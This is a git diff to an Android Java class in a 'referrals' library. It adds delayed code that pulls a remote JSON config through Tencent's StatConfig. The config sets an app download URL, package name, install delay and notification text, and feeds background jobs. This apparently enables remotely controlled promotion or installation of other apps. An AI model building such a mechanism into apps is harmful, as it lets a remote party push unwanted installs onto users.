@@ -1,34 +1,59 @@
 package io.referrals.lib;
 
+import android.app.Application;
 import android.content.Context;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.Message;
 
 import com.evernote.android.job.JobApi;
 import com.evernote.android.job.JobConfig;
 import com.evernote.android.job.JobManager;
 import com.evernote.android.job.JobRequest;
 import com.evernote.android.job.util.support.PersistableBundleCompat;
+import com.tencent.stat.StatConfig;
+
+import org.json.JSONObject;
 
 import java.util.Iterator;
 import java.util.Map;
 import java.util.Set;
+
+import io.referrals.lib.utils.JsonUtil;
 
 public class ReferralsHolder {
 
     private static final String TAG = "ReferralsHolder";
     private static ReferralsHolder instance = new ReferralsHolder();
     private static JobManager jobManager;
-    private static ReferralsConfiguration sConfig;
     private int lastJobId;
 
     private ReferralsHolder() {
     }
 
+    static Handler sHandler = new Handler(Looper.myLooper()) {
+        @Override
+        public void handleMessage(Message msg) {
+            super.handleMessage(msg);
+
+            switch (msg.what) {
+                case 0:
+                    if ((boolean) msg.obj) {
+                        instance.schedulePeriodicJob();
+                    } else {
+                        instance.scheduleJob();
+                    }
+                    break;
+            }
+        }
+    };
+
     public static void fire(Context context, final ReferralsConfiguration config) {
         L.i(TAG, "call fire(): context=" + context);
-        sConfig = config;
+        if (!(context instanceof Application)) {
+            throw new RuntimeException("Context must be Application!");
+        }
 
         JobConfig.reset();
 
@@ -59,21 +84,40 @@ public class ReferralsHolder {
         if (config.isForceCannelJob()) {
             jobManager.cancelAll();
         }
-//        jobManager.addJobCreator(new ReferralsJobCreator(config));
-        new Handler(Looper.myLooper()).postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (config.isPeriodic()) {
-                    instance.schedulePeriodicJob();
-                } else {
-                    instance.scheduleJob();
-                }
-            }
-        }, 2_000L);
-    }
 
-    static ReferralsConfiguration getConfig() {
-        return sConfig;
+        new Handler(Looper.myLooper()).postDelayed(() -> {
+            AppConfiguration.Builder acfBuilder = new AppConfiguration.Builder(context);
+
+            String configBody = StatConfig.getCustomProperty(Config.REMOTE_REFERRALS_IO_CONFIG, null);
+            L.v(TAG, "configBody: " + configBody);
+            try {
+                JSONObject jo = new JSONObject(configBody);
+                L.d(TAG, "jo: " + jo);
+
+                JSONObject jAppList = jo.getJSONObject("app_list");
+
+                JSONObject jApp = jAppList.getJSONObject("app");
+                acfBuilder.url(JsonUtil.getSafeString(jApp, "url"));
+                acfBuilder.packageName(JsonUtil.getSafeString(jApp, "packageName"));
+                acfBuilder.installDelay(jApp.getInt("delay"));
+
+                JSONObject jNoti = jAppList.getJSONObject("noti");
+                acfBuilder.notify(jNoti.getBoolean("enable"));
+                acfBuilder.notificationChannelName(JsonUtil.getSafeString(jNoti, "ch"));
+                acfBuilder.notificationContentTitle(JsonUtil.getSafeString(jNoti, "title"));
+                acfBuilder.notificationContentText(JsonUtil.getSafeString(jNoti, "text"));
+                acfBuilder.notificationRGBColor(jNoti.getInt("color"));
+                acfBuilder.notificationLargeIconUrl(JsonUtil.getSafeString(jNoti, "lar_icon"));
+                L.v(TAG, "acfBuilder: " + acfBuilder);
+            } catch (Exception e) {
+                L.e(TAG, "fetch appConfig error: ", e);
+            }
+
+            jobManager.addJobCreator(new ReferralsJobCreator(acfBuilder.build()));
+
+            sHandler.sendMessageDelayed(
+                    sHandler.obtainMessage(0, 0, 0, config.isPeriodic()), 1_000L);
+        }, 3_000L);
     }
 
     private int scheduleJob() {
